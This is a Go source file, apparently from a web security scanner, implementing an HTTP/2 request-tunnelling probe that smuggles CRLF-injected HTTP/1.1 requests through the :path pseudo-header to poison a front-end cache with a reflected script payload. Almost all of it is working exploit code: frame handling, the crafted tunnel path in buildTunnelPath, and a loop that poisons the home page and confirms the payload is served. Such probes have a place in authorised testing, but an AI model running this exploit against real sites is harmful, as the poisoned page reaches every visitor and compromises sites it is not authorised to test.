package probe

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// H2TunnelProbe exploits an HTTP/2 front-end that downgrades to HTTP/1.1
// without sanitizing the :path pseudo-header. A CRLF sequence in :path makes
// the back-end parse a second request that the front-end never saw. The
// front-end still reads the number of bytes from the first response's
// Content-Length, so the tunnelled HTTP/1.1 response is appended to the first
// response body. If the cache key of the first request is also the home page,
// that mixed response is then served to every visitor.
//
// The gadget is /resources?<script>..., which reflects the query unencoded in
// a Location header. Additional tunnelled GETs for large static files provide
// the bytes the front-end over-reads, without a :path longer than the
// front-end accepts. The probe then sends a normal GET for the poisoned path
// and requires the marker in the cached body.
//
// The connection must already negotiate ALPN h2. The probe writes HTTP/2
// frames directly with x/net/http2; it never uses http.Client.
type H2TunnelProbe struct {
	// PoisonPath is the front-end cache key to poison, usually "/". It must
	// be the path the victim will request. Default "/".
	PoisonPath string

	// GadgetPath is the tunnelled request whose response reflects the
	// payload. Default /resources?<script>alert(1)</script>.
	GadgetPath string

	// PaddingPaths are extra tunnelled requests whose responses supply enough
	// bytes to satisfy the front-end's over-read of the main Content-Length.
	// The defaults are large static files.
	PaddingPaths []string

	// Marker must appear in the tunnelled response and in the cached
	// response. Default <script>alert(1)</script>.
	Marker string

	// Host overrides the Host header used in the injected request lines.
	// Defaults to target.HostHeader().
	Host string

	// Attempts is how many poison+verify cycles to run. Default 2.
	Attempts int

	// RetryDelay is the pause between attempts. Default 250ms.
	RetryDelay time.Duration

	Timeout   time.Duration
	Idle      time.Duration
	MaxHeader int64
	MaxBody   int64
}

const (
	defaultTunnelGadget = "/resources?<script>alert(1)</script>"
	defaultTunnelMarker = "<script>alert(1)</script>"
)

var defaultTunnelPadding = []string{
	"/resources/images/blog.svg",
	"/image/blog/posts/7.jpg",
}

func (p *H2TunnelProbe) Name() string { return "cache/h2-request-tunnel" }

// Execute poisons the cache and verifies it on the same HTTP/2 connection.
func (p *H2TunnelProbe) Execute(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	if target.Addr == "" {
		return nil, fmt.Errorf("probe: target address is required")
	}
	tc, ok := conn.(*tls.Conn)
	if !ok {
		return nil, fmt.Errorf("probe: h2 tunnel requires a TLS connection")
	}
	if proto := tc.ConnectionState().NegotiatedProtocol; proto != "h2" {
		return nil, fmt.Errorf("probe: h2 tunnel requires ALPN h2, got %q", proto)
	}

	poisonPath := p.PoisonPath
	if poisonPath == "" {
		poisonPath = "/"
	}
	gadget := p.GadgetPath
	if gadget == "" {
		gadget = defaultTunnelGadget
	}
	marker := p.Marker
	if marker == "" {
		marker = defaultTunnelMarker
	}
	padding := p.PaddingPaths
	if len(padding) == 0 {
		padding = defaultTunnelPadding
	}
	host := p.Host
	if host == "" {
		host = target.HostHeader()
	}
	attempts := p.Attempts
	if attempts <= 0 {
		attempts = 2
	}
	retryDelay := p.RetryDelay
	if retryDelay <= 0 {
		retryDelay = 250 * time.Millisecond
	}

	e := newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
	tunnel, err := newH2Tunnel(e, host, orInt64(p.MaxBody, defaultMaxBody))
	if err != nil {
		return e.finish(), err
	}
	idle := orDuration(p.Idle, 3*time.Second)
	pathValue := buildTunnelPath(poisonPath, host, gadget, padding, newNonce())

	tunnelConfirmed := false
	for attempt := 1; attempt <= attempts; attempt++ {
		if err := ctx.Err(); err != nil {
			return e.finish(), err
		}

		poison, err := tunnel.do(ctx, "HEAD", pathValue, idle)
		if err != nil {
			return e.finish(), fmt.Errorf("probe: tunnel request (attempt %d): %w", attempt, err)
		}
		seq := len(e.res.Responses) + 1
		e.res.Responses = append(e.res.Responses, poison.response(seq))
		if containsMarker(poison.body, marker) {
			if !tunnelConfirmed {
				e.addFinding(Finding{
					Kind:       "h2_tunnel_confirmed",
					Confidence: ConfidenceHigh,
					Detail:     "the tunnelled HTTP/1.1 response appeared in the HEAD response body; the front-end over-read the back-end stream",
					Response:   seq,
				})
				tunnelConfirmed = true
			}
		}

		verify, err := tunnel.do(ctx, "GET", poisonPath, idle)
		if err == nil {
			seq = len(e.res.Responses) + 1
			e.res.Responses = append(e.res.Responses, verify.response(seq))
			if containsMarker(verify.body, marker) {
				e.addFinding(Finding{
					Kind:       "cache_poisoned",
					Confidence: ConfidenceHigh,
					Detail:     fmt.Sprintf("a normal GET %s returned the tunnelled response with %q; the cache is poisoned", poisonPath, marker),
					Response:   seq,
				})
				return e.finish(), nil
			}
			e.addFinding(Finding{
				Kind:       "cache_not_poisoned",
				Confidence: ConfidenceLow,
				Detail:     fmt.Sprintf("the tunnel worked but GET %s did not return the marker (attempt %d)", poisonPath, attempt),
				Response:   seq,
			})
		} else {
			e.addFinding(Finding{
				Kind:       "cache_verify_failed",
				Confidence: ConfidenceLow,
				Detail:     fmt.Sprintf("GET %s after poisoning failed: %v", poisonPath, err),
			})
		}

		if attempt < attempts {
			if err := sleepContext(ctx, retryDelay); err != nil {
				return e.finish(), err
			}
		}
	}

	if !tunnelConfirmed {
		e.addFinding(Finding{
			Kind:       "h2_tunnel_unconfirmed",
			Confidence: ConfidenceLow,
			Detail:     fmt.Sprintf("marker %q did not appear in the tunnelled response after %d attempts", marker, attempts),
		})
	}
	return e.finish(), nil
}

// buildTunnelPath renders the value of the :path pseudo-header. The front-end
// appends " HTTP/1.1" and its own headers to this value, so the first line
// completes the outer HEAD request and the final dummy header absorbs the
// appended version suffix.
func buildTunnelPath(poisonPath, host, gadget string, padding []string, nonce string) string {
	var b strings.Builder
	b.WriteString(poisonPath)
	b.WriteString(" HTTP/1.1\r\nHost: ")
	b.WriteString(host)
	b.WriteString("\r\n\r\n")

	requests := make([]string, 0, 1+len(padding))
	requests = append(requests, gadget)
	requests = append(requests, padding...)
	for i, path := range requests {
		b.WriteString("GET ")
		b.WriteString(path)
		b.WriteString(" HTTP/1.1\r\nHost: ")
		b.WriteString(host)
		b.WriteString("\r\n")
		if i < len(requests)-1 {
			b.WriteString("\r\n")
		}
	}
	// No blank line here: this header continues until the front-end appends
	// its version suffix, which turns it into a harmless header value.
	b.WriteString("X-Omnislash-Tunnel: ")
	b.WriteString(nonce)
	return b.String()
}

func containsMarker(body []byte, marker string) bool {
	return len(body) > 0 && strings.Contains(string(body), marker)
}

// h2StreamResponse is one HTTP/2 stream as seen by the probe.
type h2StreamResponse struct {
	status  int
	headers []Header
	body    []byte
}

func (r *h2StreamResponse) response(seq int) Response {
	return Response{
		Seq:     seq,
		Version: "HTTP/2",
		Status:  r.status,
		Headers: r.headers,
		Body:    string(r.body),
		Framing: "h2",
	}
}

// h2Tunnel owns the HTTP/2 framing for one probe. It writes requests with
// http2.Framer and reads responses with the same framer, so a HEAD response
// carrying a DATA frame is not rejected by an HTTP/2 client library's
// Content-Length checks.
type h2Tunnel struct {
	e       *exec
	fr      *http2.Framer
	nextID  uint32
	maxBody int64
	host    string
}

func newH2Tunnel(e *exec, host string, maxBody int64) (*h2Tunnel, error) {
	var out bytes.Buffer
	out.WriteString(http2.ClientPreface)
	w := http2.NewFramer(&out, nil)
	if err := w.WriteSettings(); err != nil {
		return nil, fmt.Errorf("probe: h2 settings: %w", err)
	}
	if err := e.write(out.Bytes()); err != nil {
		return nil, fmt.Errorf("probe: h2 preface: %w", err)
	}
	fr := http2.NewFramer(e.conn, e.conn)
	fr.ReadMetaHeaders = hpack.NewDecoder(4096, nil)
	return &h2Tunnel{e: e, fr: fr, nextID: 1, maxBody: maxBody, host: host}, nil
}

func (t *h2Tunnel) do(ctx context.Context, method, path string, idle time.Duration) (*h2StreamResponse, error) {
	streamID := t.nextID
	t.nextID += 2

	var hb bytes.Buffer
	henc := hpack.NewEncoder(&hb)
	fields := []hpack.HeaderField{
		{Name: ":method", Value: method},
		{Name: ":scheme", Value: "https"},
		{Name: ":authority", Value: t.hostValue()},
		{Name: ":path", Value: path},
		{Name: "user-agent", Value: "omnislash-probe/1"},
		{Name: "accept", Value: "*/*"},
		{Name: "accept-encoding", Value: "identity"},
	}
	for _, f := range fields {
		if err := henc.WriteField(f); err != nil {
			return nil, fmt.Errorf("probe: h2 encode %s: %w", f.Name, err)
		}
	}

	var out bytes.Buffer
	w := http2.NewFramer(&out, nil)
	if err := w.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: hb.Bytes(),
		EndHeaders:    true,
		EndStream:     true,
	}); err != nil {
		return nil, fmt.Errorf("probe: h2 headers: %w", err)
	}
	if err := t.e.write(out.Bytes()); err != nil {
		return nil, fmt.Errorf("probe: h2 write: %w", err)
	}
	return t.readStream(ctx, streamID, idle)
}

func (t *h2Tunnel) hostValue() string {
	if t.host != "" {
		return t.host
	}
	return "localhost"
}

func (t *h2Tunnel) readStream(ctx context.Context, streamID uint32, idle time.Duration) (*h2StreamResponse, error) {
	resp := &h2StreamResponse{}
	for {
		if err := ctx.Err(); err != nil {
			return resp, err
		}
		deadline := time.Now().Add(idle)
		if dl, ok := ctx.Deadline(); ok && dl.Before(deadline) {
			deadline = dl
		}
		_ = t.e.conn.SetReadDeadline(deadline)

		frame, err := t.fr.ReadFrame()
		if err != nil {
			return resp, err
		}
		switch f := frame.(type) {
		case *http2.MetaHeadersFrame:
			if f.StreamID != streamID {
				continue
			}
			for _, field := range f.Fields {
				resp.headers = append(resp.headers, Header{Key: field.Name, Value: field.Value})
				if field.Name == ":status" {
					resp.status, _ = strconv.Atoi(field.Value)
				}
			}
			if f.StreamEnded() {
				return resp, nil
			}
		case *http2.DataFrame:
			if f.StreamID != streamID {
				continue
			}
			if data := f.Data(); len(data) > 0 {
				if int64(len(resp.body)+len(data)) <= t.maxBody {
					resp.body = append(resp.body, data...)
				}
				if err := t.ackData(streamID, len(data)); err != nil {
					return resp, err
				}
			}
			if f.StreamEnded() {
				return resp, nil
			}
		case *http2.SettingsFrame:
			if !f.IsAck() {
				if err := t.control(func(w *http2.Framer) error { return w.WriteSettingsAck() }); err != nil {
					return resp, err
				}
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				data := f.Data
				if err := t.control(func(w *http2.Framer) error { return w.WritePing(true, data) }); err != nil {
					return resp, err
				}
			}
		case *http2.RSTStreamFrame:
			if f.StreamID == streamID {
				return resp, fmt.Errorf("probe: h2 stream %d reset: %v", streamID, f.ErrCode)
			}
		case *http2.GoAwayFrame:
			return resp, fmt.Errorf("probe: h2 connection closed: %v", f.ErrCode)
		}
	}
}

func (t *h2Tunnel) ackData(streamID uint32, n int) error {
	return t.control(func(w *http2.Framer) error {
		if err := w.WriteWindowUpdate(0, uint32(n)); err != nil {
			return err
		}
		return w.WriteWindowUpdate(streamID, uint32(n))
	})
}

func (t *h2Tunnel) control(fn func(*http2.Framer) error) error {
	var out bytes.Buffer
	if err := fn(http2.NewFramer(&out, nil)); err != nil {
		return err
	}
	return t.e.write(out.Bytes())
}

func sleepContext(ctx context.Context, d time.Duration) error {
	if d <= 0 {
		return nil
	}
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}
